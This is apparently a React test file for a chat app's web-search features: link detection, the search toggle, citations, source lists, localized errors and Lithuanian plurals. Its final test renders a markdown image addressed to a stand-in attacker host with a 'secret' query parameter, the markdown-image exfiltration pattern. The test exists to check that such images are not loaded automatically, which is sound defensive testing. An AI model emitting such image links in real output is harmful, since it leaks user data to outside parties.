import { act, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router-dom";
import i18n from "@/i18n";
import { providerErrorText } from "@/lib/errors";
import type { AppSettings, Message, WebSource, WebStatus, WebUserSettings } from "@/lib/types";
import { useSettings } from "@/stores/settings";
import { useWeb } from "@/stores/web";
import { Composer } from "./Composer";
import { Markdown } from "./Markdown";
import { TooltipProvider } from "./ui";
import { citationTargets, WebSourceList, WebSteps } from "./WebParts";

const PREFS: WebUserSettings = {
  auto_read_links: true,
  search_by_default: false,
  keep_search_on: false,
  results: 5,
  expand_steps: false,
  task_provider_id: null,
  task_model: null,
  privacy_acknowledged: true,
};
const STATUS: WebStatus = { enabled: true, search_available: true, engine: "searxng", max_urls_per_message: 2, max_results: 8, is_admin: false };

function wrap(ui: React.ReactNode) {
  return render(
    <MemoryRouter>
      <TooltipProvider>{ui}</TooltipProvider>
    </MemoryRouter>,
  );
}

function setupComposer(status: WebStatus | null, prefs: Partial<WebUserSettings> = {}) {
  const update = vi.fn().mockResolvedValue(null);
  useSettings.setState({ settings: { enter_to_send: true, web: { ...PREFS, ...prefs } } as AppSettings, update });
  useWeb.setState({ status, search: {} });
  const onSend = vi.fn().mockResolvedValue(undefined);
  wrap(<Composer onSend={onSend} model={{ providerId: "p", model: "m" }} onModelChange={() => {}} visionSupported={false} conversationKey="c1" />);
  return { onSend, update, input: screen.getByLabelText("Message") as HTMLTextAreaElement };
}

afterEach(async () => {
  await act(() => i18n.changeLanguage("en"));
});

describe("composer links and search", () => {
  it("shows detected links as chips and sends only the selected ones", async () => {
    const { onSend, input } = setupComposer(STATUS);
    await userEvent.type(input, "Compare https://a.example.com/x and https://b.example.org (and `https://code.example`) https://c.example.net");
    const chips = within(screen.getByRole("list", { name: "Links in this message" })).getAllByRole("button");
    expect(chips).toHaveLength(2); // limited to the administrator's maximum
    expect(screen.getByText("Only the first 2 links will be read.")).toBeInTheDocument();
    await userEvent.click(chips[1]); // skip the second one
    expect(chips[1]).toHaveAttribute("aria-pressed", "false");
    await userEvent.click(input);
    await userEvent.keyboard("{Enter}");
    expect(onSend).toHaveBeenCalledWith(expect.any(String), [], { urls: ["https://a.example.com/x"], web_search: false });
  });

  it("asks before reading links when auto-read is off", async () => {
    const { onSend, input } = setupComposer(STATUS, { auto_read_links: false });
    await userEvent.type(input, "see https://a.example.com");
    const chip = screen.getByRole("button", { name: "Read https://a.example.com" });
    expect(chip).toHaveAttribute("aria-pressed", "false");
    await userEvent.click(chip);
    await userEvent.click(input);
    await userEvent.keyboard("{Enter}");
    expect(onSend.mock.calls[0][2]).toEqual({ urls: ["https://a.example.com"], web_search: false });
  });

  it("search toggle: off, on for one message, then off again", async () => {
    const { onSend, input } = setupComposer(STATUS);
    const toggle = screen.getByTestId("search-toggle");
    expect(toggle).toHaveAttribute("aria-pressed", "false");
    expect(toggle).toHaveAccessibleName("Search the web for this message");
    await userEvent.click(toggle);
    expect(toggle).toHaveAttribute("aria-pressed", "true");
    await userEvent.type(input, "latest news{Enter}");
    expect(onSend.mock.calls[0][2]).toEqual({ urls: [], web_search: true });
    await vi.waitFor(() => expect(screen.getByTestId("search-toggle")).toHaveAttribute("aria-pressed", "false"));
  });

  it("is disabled with an explanation when no engine is configured", async () => {
    setupComposer({ ...STATUS, search_available: false, engine: null });
    const toggle = screen.getByTestId("search-toggle");
    expect(toggle).toHaveAttribute("aria-disabled", "true");
    expect(toggle).not.toHaveAttribute("aria-pressed");
    await userEvent.hover(toggle);
    expect((await screen.findAllByText("Web search isn't set up on this server. Ask your administrator.")).length).toBeGreaterThan(0);
  });

  it("disappears when web access is off, and says links won't be read", async () => {
    const { onSend, input } = setupComposer({ ...STATUS, enabled: false, search_available: false });
    expect(screen.queryByTestId("search-toggle")).toBeNull();
    await userEvent.type(input, "read https://a.example.com");
    expect(screen.queryByRole("list", { name: "Links in this message" })).toBeNull();
    expect(screen.getByText("Links are not read because web access is turned off on this server.")).toBeInTheDocument();
    await userEvent.keyboard("{Enter}");
    expect(onSend.mock.calls[0][2]).toEqual({ urls: null, web_search: false });
  });

  it("shows the privacy notice the first time search is turned on", async () => {
    const { update } = setupComposer(STATUS, { privacy_acknowledged: false });
    await userEvent.click(screen.getByTestId("search-toggle"));
    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByText(/self-hosted|own SearXNG/)).toBeInTheDocument();
    await userEvent.click(within(dialog).getByRole("button", { name: "Turn on web search" }));
    expect(screen.getByTestId("search-toggle")).toHaveAttribute("aria-pressed", "true");
    expect(update).toHaveBeenCalledWith({ web: expect.objectContaining({ privacy_acknowledged: true }) });
  });

  it("works in Lithuanian at once", async () => {
    setupComposer(STATUS);
    await act(() => i18n.changeLanguage("lt"));
    expect(screen.getByTestId("search-toggle")).toHaveAccessibleName("Ieškoti internete šiai žinutei");
    expect(screen.getByText("Paieška")).toBeInTheDocument();
  });
});

/* ------------------------------------------------------------- messages */
const SOURCE = (id: string, n: number, extra: Partial<WebSource> = {}): WebSource => ({
  id,
  message_id: "a1",
  origin: "search",
  position: n,
  url: `https://site${n}.example/page`,
  final_url: null,
  domain: `site${n}.example`,
  title: `Title ${n}`,
  site_name: null,
  description: null,
  published: null,
  kind: "html",
  status: "ok",
  error_code: null,
  error_params: {},
  chars: 1000,
  truncated: false,
  notes: [],
  query: null,
  snippet: null,
  rank: n,
  fetched_at: "2026-03-02T10:00:00Z",
  ...extra,
});

const SOURCES = { s1: SOURCE("s1", 1), s2: SOURCE("s2", 2, { status: "snippet", error_code: "web.not_found" }), s3: SOURCE("s3", 3) };

const MESSAGE = {
  id: "a1",
  conversation_id: "c1",
  parent_id: "u1",
  position: 1,
  role: "assistant",
  content: "Fact [1] and [2]. Unknown [7]. Code `[1]`.",
  reasoning: "",
  status: "complete",
  error: null,
  provider_id: "p",
  model: "m",
  attachments: [],
  sources: [],
  metrics: {},
  web: {
    search: true,
    queries: ["festival vilnius"],
    steps: [
      { id: 0, kind: "queries", status: "done", code: null, params: { queries: ["festival vilnius"], fallback: false } },
      { id: 1, kind: "search", status: "done", code: null, params: { count: 3 } },
      { id: 2, kind: "read_results", status: "done", code: null, params: { total: 3, done: 3, failed: 1, domains: ["site1.example", "site2.example"] } },
      { id: 3, kind: "budget", status: "done", code: null, params: { used: 2, total: 3 } },
    ],
    refs: [
      { n: 1, source_id: "s1", included: true },
      { n: 2, source_id: "s2", included: true },
      { n: 3, source_id: "s3", included: false },
    ],
  },
  created_at: "2026-03-02T10:00:00Z",
  updated_at: "2026-03-02T10:00:00Z",
} as Message;

describe("citations", () => {
  it("links valid citation numbers, keeps others as text, ignores code", () => {
    const { container } = wrap(<Markdown content={MESSAGE.content} citations={citationTargets(MESSAGE, SOURCES)} />);
    const cites = container.querySelectorAll("a[data-citation]");
    expect([...cites].map((a) => a.textContent)).toEqual(["1", "2"]);
    const first = screen.getByRole("link", { name: "Source 1: Title 1" });
    expect(first).toHaveAttribute("href", "https://site1.example/page");
    expect(first).toHaveAttribute("target", "_blank");
    expect(first.getAttribute("rel")).toContain("noopener");
    expect(first.getAttribute("rel")).toContain("noreferrer");
    expect(container.textContent).toContain("Unknown [7]");
    expect(container.querySelector("code")?.textContent).toBe("[1]");
  });

  it("citations are keyboard reachable and show the source on focus", async () => {
    wrap(<Markdown content="See [1]." citations={citationTargets(MESSAGE, SOURCES)} />);
    await userEvent.tab();
    expect(screen.getByRole("link", { name: "Source 1: Title 1" })).toHaveFocus();
    expect((await screen.findAllByText("https://site1.example/page")).length).toBeGreaterThan(0);
  });

  it("excluded sources are not citable", () => {
    expect(Object.keys(citationTargets(MESSAGE, SOURCES))).toEqual(["1", "2"]);
  });
});

describe("web steps and sources", () => {
  it("summarizes and expands the step log", async () => {
    wrap(<WebSteps message={MESSAGE} sources={SOURCES} defaultOpen={false} />);
    const toggle = screen.getByRole("button", { name: "Show web activity" });
    expect(toggle).toHaveTextContent("Used 2 sources");
    await userEvent.click(toggle);
    expect(screen.getByText("Searching for: festival vilnius")).toBeInTheDocument();
    expect(screen.getByText("Found 3 results")).toBeInTheDocument();
    expect(screen.getByText("Read 2 sources · 1 unreadable, used the search summary")).toBeInTheDocument();
    expect(screen.getByText("Used 2 of 3 sources because of the model's context limit")).toBeInTheDocument();
    expect(screen.getByText("site1.example")).toBeInTheDocument();
  });

  it("uses Lithuanian plural forms", async () => {
    await act(() => i18n.changeLanguage("lt"));
    wrap(<WebSteps message={MESSAGE} sources={SOURCES} defaultOpen />);
    expect(screen.getByText("Panaudoti 2 šaltiniai")).toBeInTheDocument();
    expect(screen.getByText("Rasti 3 rezultatai")).toBeInTheDocument();
    expect(screen.getByText("Dėl modelio konteksto ribos panaudota 2 iš 3 šaltinių")).toBeInTheDocument();
  });

  it("shows running state live", () => {
    const running = { ...MESSAGE, web: { ...MESSAGE.web, steps: [{ id: 0, kind: "read_results", status: "running", code: null, params: { total: 4, done: 1 } }] } } as Message;
    wrap(<WebSteps message={running} sources={{}} defaultOpen={false} />);
    expect(screen.getAllByText("Reading 4 sources").length).toBeGreaterThan(0);
  });

  it("lists sources with title, domain and honest status", () => {
    wrap(<WebSourceList refs={MESSAGE.web!.refs!} sources={SOURCES} conversationId="c1" />);
    const list = screen.getByRole("list", { name: "Sources" });
    const links = within(list).getAllByRole("link");
    expect(links[0]).toHaveTextContent("Title 1");
    expect(links[0]).toHaveAttribute("href", "https://site1.example/page");
    expect(links[0].getAttribute("rel")).toContain("noreferrer");
    expect(links[1]).toHaveTextContent("Summary only");
    expect(links[2]).toHaveTextContent("Left out because of the model's context limit.");
    expect(list.querySelector("img")).toBeNull(); // no favicons: no third-party requests
  });
});

describe("web error codes", () => {
  it("are localized in both languages", async () => {
    expect(providerErrorText("web.engine_unreachable", { engine: "SearXNG" }, "fallback")).toBe("The search engine (SearXNG) could not be reached.");
    expect(providerErrorText("web.searxng_json_disabled", {}, "x")).toContain("settings.yml");
    await act(() => i18n.changeLanguage("lt"));
    expect(providerErrorText("web.engine_unreachable", { engine: "SearXNG" }, "fallback")).toBe("Paieškos sistemos (SearXNG) pasiekti nepavyko.");
    expect(providerErrorText("web.blocked_address", {}, "x")).toContain("privatų");
  });
});

describe("remote images", () => {
  it("are never loaded automatically; the user can open them explicitly", () => {
    const { container } = wrap(<Markdown content={"![chart](https://evil.example/c.png?d=secret)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("Remote image not loaded: chart")).toBeInTheDocument();
    const open = screen.getByRole("link", { name: /Open image/ });
    expect(open).toHaveAttribute("href", "https://evil.example/c.png?d=secret");
    expect(open.getAttribute("rel")).toContain("noreferrer");
  });
});
